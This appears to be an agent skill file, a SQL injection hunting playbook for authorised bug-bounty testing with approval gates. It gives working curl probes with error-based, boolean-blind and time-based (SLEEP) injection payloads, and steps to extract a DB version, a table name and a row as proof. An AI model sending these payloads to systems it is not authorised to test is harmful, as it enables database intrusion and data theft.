---
name: sqli
description: SQL injection hunting playbook. Use when parameters influence database queries — login forms, search, filters, sort/order, report exports, or error messages mentioning SQL syntax.
allowed-tools:
  - shell
  - http
  - coverage
  - confirm_finding
---

# SQL injection playbook

Stay manual with curl/http until you have evidence. Only escalate to sqlmap with explicit user approval.

## 1. Identify sinks
Parameters in GET/POST/JSON, cookies, headers. Note DB errors in responses (MySQL, PostgreSQL, MSSQL, Oracle).

## 2. Error-based probes
```
curl -ksS "$TARGET/item?id=1'" -w "\nHTTP %{http_code}\n"
curl -ksS "$TARGET/item?id=1' OR '1'='1" -w "\nHTTP %{http_code}\n"
```

## 3. Boolean blind
Compare responses for true/false pairs:
```
curl -ksS "$TARGET/item?id=1 AND 1=1" | wc -c
curl -ksS "$TARGET/item?id=1 AND 1=2" | wc -c
```

## 4. Time-based blind
```
curl -ksS "$TARGET/item?id=1' AND SLEEP(5)-- -" -w "time=%{time_total}\n"
```

## 5. Confirm impact
Extract minimal proof (DB version, table name, single row). Map to VRT `Injection > SQL Injection` and CWE-89. Include exact curl and response excerpt in `confirm_finding`.
